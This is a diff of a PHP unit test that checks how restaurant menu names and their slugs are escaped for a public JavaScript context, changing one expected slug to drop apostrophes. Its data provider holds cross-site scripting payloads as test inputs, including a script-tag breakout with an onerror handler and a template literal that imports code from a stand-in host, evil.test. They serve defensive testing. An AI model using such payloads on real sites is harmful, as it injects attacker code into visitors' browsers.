@@ -35,7 +35,8 @@ class MenuPublicoContextoJsTest extends TestCase
             'template literal' => ['Tacos ${alert(1)} `x` ${import(`//evil.test/a.js`)}', 'tacos-template'],
             'cierre de script' => ['</script><img src=x onerror=alert(1)>', 'tacos-script'],
             'barra invertida final' => ['Tacos del Norte\\', 'tacos-barra'],
-            'apostrofo y comillas' => ['Tony\'s "Special"', "tony's-special"],
+            // El nombre es hostil; el slug ya no puede serlo: /{slug} solo admite [a-z0-9-].
+            'apostrofo y comillas' => ['Tony\'s "Special"', 'tonys-special'],
         ];
     }
 
